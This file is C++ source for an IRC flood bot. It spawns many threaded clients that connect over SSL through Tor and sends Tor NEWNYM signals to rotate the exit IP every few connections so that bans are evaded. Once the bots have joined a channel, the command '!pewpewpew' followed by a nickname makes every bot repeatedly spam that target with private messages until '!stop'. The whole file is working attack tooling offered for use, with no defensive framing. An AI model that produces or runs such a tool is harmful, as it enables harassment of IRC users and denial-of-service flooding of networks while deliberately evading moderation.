#include <iostream>
#include <thread>
#include <regex>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <string>
#include <boost/regex.hpp>
#include <openssl/ssl.h>
#include <openssl/err.h>
#define writeS(fd, data) write(fd, data, strlen(data))
#define MAXSIZE 5120

using namespace std;

char *shift( int mov, char * array, int size );
void irc_connect( const char * server, const char * port, const char * channel, const char * nick, int num );
void resetIP( );

/**

This code is sorta fucked right now. It works but there is a room for improvement
sorta messed up my oop but ill fix it later( maybe )
 g++ -o first first.cpp -std=c++11 -lboost_regex -O2 -Wno-system-headers -L/usr/include/openssl/ssl.h -lssl -lcrypto -pthread -lpthread -Wl,--no-as-needed

**/

class Socket{
	
	protected:
		char buffer[MAXSIZE];
		int sock;

	public:
		void SockCon( const char *host , const char *port ){

			struct addrinfo hints, *addr;
			memset(&hints, 0 , sizeof( struct addrinfo ));
			hints.ai_family = AF_INET;
			hints.ai_socktype  = SOCK_STREAM;

			if(getaddrinfo( host, port, &hints, &addr ) == 0){

				sock = socket( addr->ai_family,
						addr->ai_socktype,	
						addr->ai_protocol );

				if ( sock >= 0 ){

					if ( connect(sock, addr->ai_addr, addr->ai_addrlen) >= 0 ) return ;
					throw "Cant connect()";

				}
		
			}

			throw "getaddrinfo failed";	

			//return sock;
		}
		virtual char * getData( ){ 
	       
			memset(&buffer, 0, sizeof(buffer));
			if( read(sock, &buffer, sizeof(buffer)) == 0) throw "Connection closed cannot read from socket";
			return buffer;
		}
		virtual void sendData( char * data ){
			char buff[MAXSIZE];
			sprintf(buff, "%s\r\n", data);
			if(writeS( sock, buff ) == -1 ) throw "Connection closed cannot write to socket";
			memset(&buff, 0, sizeof(buff));
		}
		int getSock( ){
			return sock;
		}
		~Socket(){
		
			close(sock);
		}

};
class Socks4: public Socket{

	public:
		void con( const char * SAddr, const char * SPort, const char * dstip, int  dstport){

			
			char data[8];
			this->SockCon( SAddr, SPort );
			unsigned char *x = (unsigned char *)"\x04\x01";
			unsigned char *null = (unsigned char *)"\x00";
			short port = htons(dstport);
			long ip = inet_addr(dstip);
			send(sock, x, 2, 0);
			send(sock, &port, 2, 0);
			send(sock, &ip, 4, 0);
			send(sock, null, 1, 0);
			recv(sock, &data, sizeof(data),0 );

		}

};
class SSLSocks4: public Socks4{
	/* Thank you Sean Walton for the ssl client template :DDD */

	public:
		void con( const char * SAddr, const char * SPort, const char * dstip, int  dstport){

			Socks4::con( SAddr, SPort, dstip, dstport );
			SSL_library_init();
			ctx = InitCTX();
			ssl = SSL_new( ctx );
			SSL_set_fd(ssl, sock);
			if( SSL_connect( ssl ) == -1 ) throw stderr;


		}
		~SSLSocks4(){
			SSL_free(ssl);
			close( sock );
			SSL_CTX_free(ctx);
		}
		void sendData( char * data ){
			sprintf(data, "%s\r\n", data);
			SSL_write(ssl, data, strlen(data));
		}
		char * getData( ){
			int bytes;
			memset(&buffer, 0, sizeof(buffer));
			if(( bytes = SSL_read(ssl, buffer, sizeof(buffer) -1 )) <=0 ) throw "SSL read error";
			buffer[bytes] = 0;

			return buffer;

		}
	private:
		SSL_CTX *ctx;
		SSL *ssl;
		SSL_CTX* InitCTX(void)
		{   const SSL_METHOD *method;
    		SSL_CTX *ctx;

		    OpenSSL_add_all_algorithms();		/* Load cryptos, et.al. */
		    SSL_load_error_strings();			/* Bring in and register error messages */
    		method = SSLv23_client_method();		/* Create new client-method instance */
    		ctx = SSL_CTX_new(method);			/* Create new context */
    		if ( ctx == NULL )
    		{
		        throw stderr;
    		}
		    return ctx;
		}

		void ShowCerts(SSL* ssl)
		{   X509 *cert;
    		char *line;

		    cert = SSL_get_peer_certificate(ssl);	/* get the server's certificate */
    		if ( cert != NULL )
    		{
        		printf("Server certificates:\n");
		        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        		printf("Subject: %s\n", line);
		        free(line);							/* free the malloc'ed string */
		        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        		printf("Issuer: %s\n", line);
        		free(line);							/* free the malloc'ed string */
        		X509_free(cert);					/* free the malloc'ed certificate copy */
			}
    		else
        		printf("No certificates.\n");
}

};
class IRC: public SSLSocks4{


	public:
		void connect(const char *host , const char *port, const char *n, const char *channel){

			name =  (char *)n;
			chan = (char *)channel; 
			struct hostent * h = gethostbyname( host );
			this->con( "localhost", "9050", inet_ntoa(*((struct in_addr *)h->h_addr)), atoi( port ) );
			this->main();
		}
		void privmsg( char *who, const char *data = "Trolololololo"){

			char buff[MAXSIZE];
			sprintf(buff, "PRIVMSG %s :%s ", who ,data);
			this->sendData( buff );
			memset(&buff, 0, sizeof(buff));	
		}
		void join( char *chan ){

			char buff[MAXSIZE];
			sprintf(buff, "JOIN %s", chan);
			this->sendData( buff );
			memset(&buff, 0 , sizeof(buff));
		}
		void part(  char *chan, const char * msg = "Leaving"){

			char buff[MAXSIZE];
			sprintf(buff, "PART %s :%s", chan, msg);
			this->sendData( buff );
			memset(&buff, 0 , sizeof(buff));	
		}
		void nick( char *n ){

			char buff[MAXSIZE];
			sprintf(buff, "NICK %s", n);
			this->sendData( buff );
			memset(&buff, 0 , sizeof(buff));
		}
	private: 
		char *name;
		char *chan;
		bool spam = false;
		char *who;
		void pong( char *data, int size ){
 
			char buff[MAXSIZE];
			char *x = shift(5, data, size);
			sprintf(buff, "PONG %s", x );
			free(x);
			this->sendData( buff );
			memset(&buff, 0, sizeof(buff));
		}
		void user( const char *user = " Ass Ass  Ass ASs" ){

			char buff[MAXSIZE];
			sprintf(buff, "USER %s", user);
			this->sendData( buff );
			memset(&buff, 0 , sizeof(buff));
		}
		void main( )
		{

			this->nick( name );
			this->user();

			cout << "In main" <<  endl;

			while( 1 ){

				char * buff = this->getData();
				cout << buff;
				cout << buff;
				if ( strstr( buff, "004") !=NULL )
				{	
					cout << "Authenticated" << endl;
					break;
				}
				else if( strstr( buff, "PING :") !=NULL )
				{
					this->pong( buff , strlen(buff));
				}
				else if( strstr( buff, "433" ) !=NULL )
				{
					sprintf(name, "%s_", name);
					this->nick(name);
				}

				memset(&buff, 0 , sizeof(buff));

			}

			join( chan );

			while( 1 ){
				char * buff = this->getData();
				cout << buff;
				if( strstr( buff, "PING :") !=NULL )
				{
					this->pong( buff , strlen(buff));
				}
				else if ( strstr( buff, " PRIVMSG ") !=NULL )
				{
					string shit(buff);
					boost::regex pattern(":(.*)!(.*) PRIVMSG (.*):(.*) (.*) ");
					boost::smatch result;
					if (boost::regex_search(shit, result, pattern))
					{
						if(result[4] == "!pewpewpew")
						{
							cout << "Spamming: " << result[5] << endl;
							spam = true;
							string damm(result[5]);
							who = (char*)damm.c_str();
						}
						else if (result[4] == "!stop")
						{
							spam = false;

						}
					}

				}
				if ( spam == true )
				{

					for(int xyz = 0; xyz < 20; xyz++) this->privmsg(who);
					sleep(2);
				}
				else if ( who != NULL)
				{
					memset(&who, 0 , sizeof( who ));
				}
				memset(&buff, 0 , sizeof(buff));

			}
		}


};

int main(int argc, char const *argv[]){
	if (argc < 5 )
	{
		cout << "Usage: " << argv[0] << " <irc> <port> <channel> <threads>" << endl;
		return -1;
	}
	
	try{
		
		
		const char nick[20] = "poop";
		for(int i = 0; i < atoi(argv[4]) ; i++){

			if ( i % 5 == 0){  resetIP(); sleep(5);}
			thread first(irc_connect, argv[1], argv[2], argv[3], nick, i); //  [] ( char * nick , int num ) ->{  ...  }
			first.detach();

		}

		while( 1 ){

			sleep(1);

		}
			//irc_connect(argv[1], argv[2], argv[3], "test", 1);
			/*
			SSLSocks4 *s = new SSLSocks4();
			struct hostent * h = gethostbyname( argv[1] );
			s->con( "localhost", "9050", inet_ntoa(*((struct in_addr *)h->h_addr)), atoi( argv[2] ) );
			s->sendData("NICK ASSS\r\nUSER AAA AAA AAA AAA\r\n");
			cout << s->getData();
			cout << s->getData();
			cout << s->getData();
			*/
			//	
	}catch( char const* e ){

		cout << "Caught Exception: " << e << endl;

	}
	return 0;
}
void irc_connect( const char * server, const char * port, const char * channel, const char * nick, int num ){


	char name[MAXSIZE];
	sprintf(name, "%s%i", nick, num);
	memset(&nick, 0 , sizeof(nick));
	IRC * irc = new IRC();
	try{

		irc->connect( server, port, name, channel);

	}catch( char const * e ){

		cout  << name << " Caught Exception: "<< e << endl;
	}
	memset(&name, 0 , sizeof(name));
	delete irc;
	
}

char  *shift( int mov, char  * array, int size){
	
	int val = size - mov;
	char *n = (char*)malloc(val);

	for(int i =0;i < val ; i ++ ){
	
		n[i] = array[i+mov];
	
	}
	
	return n;

}

void resetIP( ){

	Socket * s = new Socket();
	s->SockCon( "localhost", "9051");
	s->sendData((char *)"AUTHENTICATE"); //cause lazy
	s->sendData((char *)"SIGNAL NEWNYM");
	
	delete s;
}
